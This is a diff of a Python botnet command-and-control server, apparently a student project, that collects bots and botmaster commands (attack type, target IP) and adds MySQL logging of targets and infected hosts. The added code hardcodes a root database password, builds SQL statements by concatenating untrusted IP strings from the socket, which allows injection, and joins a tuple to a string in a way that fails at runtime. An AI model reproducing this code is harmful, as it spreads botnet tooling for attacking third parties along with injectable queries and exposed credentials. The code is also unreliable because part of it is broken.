@@ -3,11 +3,20 @@ import sys
 import socket
 import threading
 import time
+import mysql.connector
+
+mydb = mysql.connector.connect(
+  host="localhost",
+  user="root",
+  password="cojimar5aBi",
+  database="sieci"
+)
+
+mycursor = mydb.cursor()
 
 startAttack: bool = False
 ip = '192.168.100.19'
 sqlDatabaseHosts = []
-sqlDatabaseTargetIP = []
 clientSockets = []
 attack_type=''
 
@@ -27,8 +36,13 @@ def thread_for_botmaster(c, st):  # wrzucic w while???
     attack_type=str(c.recv(1).decode())
     print("typ: "+attack_type)
     ip = str(c.recv(16).decode())
+    ip2 = "'" + ip + "'"
     print('received target ip=' + ip)
-    sqlDatabaseTargetIP.append(ip)
+    # dodawanie do bazy
+    sql = "INSERT INTO Target (adres_ip) VALUES (" + ip2 + ")"
+    mycursor.execute(sql)
+    mydb.commit()
+    #  //////
     startAttack = True
     stop = str(c.recv(1).decode())
     print("stop:" + stop)
@@ -36,6 +50,12 @@ def thread_for_botmaster(c, st):  # wrzucic w while???
         ip = str(c.recv(16).decode())
         startAttack = False
         print('Botmaster wants the attack to end')
+        # wyswietlanie z bazy 
+        mycursor.execute("SELECT * FROM Target")
+        myresult = mycursor.fetchall()
+        for x in myresult:
+            print(x)
+        # //////
     return
 
 
@@ -141,9 +161,16 @@ if __name__ == '__main__':
                 data = client_socket.recv(1).decode()  # info about which client type is connected: 1-bot, 2-botmaster
                 if int(data) == 1:
                     print('normal bot connected')
-
-                    sqlDatabaseHosts.append(client_socket.getpeername())
-                    print(sqlDatabaseHosts)
+                    #//////////////////////////////////////////////////////
+                    smieci= "'" + client_socket.getpeername() + "'"
+                    sql = "INSERT INTO Hosts (adres_ip) VALUES (" + smieci + ")"  ### nie wiem co to za dane wiec dalem taka nazwe zmien 
+                    mycursor.execute(sql)
+                    mydb.commit()
+                    mycursor.execute("SELECT * FROM Hosts")
+                    myresult = mycursor.fetchall()
+                    for x in myresult:
+                        print(x)
+                    #///////////////////////////////////////////////
                     t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr),daemon=True)
                     t1.start()
                     thread_array.append(t1)
